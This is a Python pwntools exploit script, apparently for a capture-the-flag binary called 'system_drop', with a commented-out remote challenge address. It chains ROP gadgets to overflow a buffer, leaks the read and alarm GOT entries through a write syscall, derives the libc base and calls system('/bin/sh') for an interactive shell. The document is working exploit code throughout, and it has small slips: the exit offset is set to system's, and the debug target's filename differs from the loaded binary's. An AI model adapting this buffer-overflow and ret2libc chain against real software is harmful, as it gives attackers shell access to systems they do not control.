from pwn import *

elf = ELF("./system_drop", checksec = False)
#libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so", checksec=False)
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so", checksec=False)

SYSCALL_ADDR = 0x40053b
MAIN_ADDR = 0x00400541
POP_RDI_RET = 0x4005d3
RET = 0x400416
POP_RSI_POP_R15_RET = 0x4005d1

READ_LIBC_OFFSET = libc.symbols.read
SYSTEM_LIBC_OFFSET = libc.symbols.system
EXIT_LIBC_OFFSET = libc.symbols.system
BINSH_LIBC_OFFSET = next(libc.search(b"/bin/sh"))

def leak_address(address):
    #syscal(syscall number(rax)= 1,fd(rdi) = 1, buffer(rsi) = <address>, length(rdx) = 0x100)
    payload = cyclic(0x20 + 0x8)
    payload += p64(POP_RSI_POP_R15_RET)
    payload += p64(address)                # the leaked address goes to RSI
    payload += p64(0xBADC0D3CAF3BAB3)      # dummy QWORD to get rid of R15
    payload += p64(POP_RDI_RET)           
    payload += p64(0x1)                    # print to standard output
    payload += p64(SYSCALL_ADDR)           # perform write syscall
    payload += p64(MAIN_ADDR)              # return to main 
    io.sendline(payload)
    
    leak = u64(io.recv(8))
    print(leak)
    try:
        io.recv()
    except:
        pass
    return leak



def pwn():
    global io
    leaked_addr = leak_address(elf.got.read)
    log.success("Leaked Read: {:X}".format(leaked_addr))
    leaked_alarm = leak_address(elf.got.alarm)
    log.success("Leak Alarm: {:X}".format(leaked_alarm))
    
    libc_base_address = leaked_addr - READ_LIBC_OFFSET
    system_address = libc_base_address + SYSTEM_LIBC_OFFSET
    exit_address = libc_base_address + EXIT_LIBC_OFFSET
    binsh_address = libc_base_address + BINSH_LIBC_OFFSET

    payload = b"A" * (0x20 + 0x8)
    payload += p64(POP_RDI_RET)
    payload += p64(binsh_address)
    payload += p64(RET)
    payload += p64(system_address)

    io.sendline(payload)

if __name__ == "__main__":
    io =  gdb.debug("./system_drop1","b main")
    #io = remote("178.62.10.249",port=30399)
    #gdb.attach(io,"b *00400569")
    pwn()
    io.interactive()
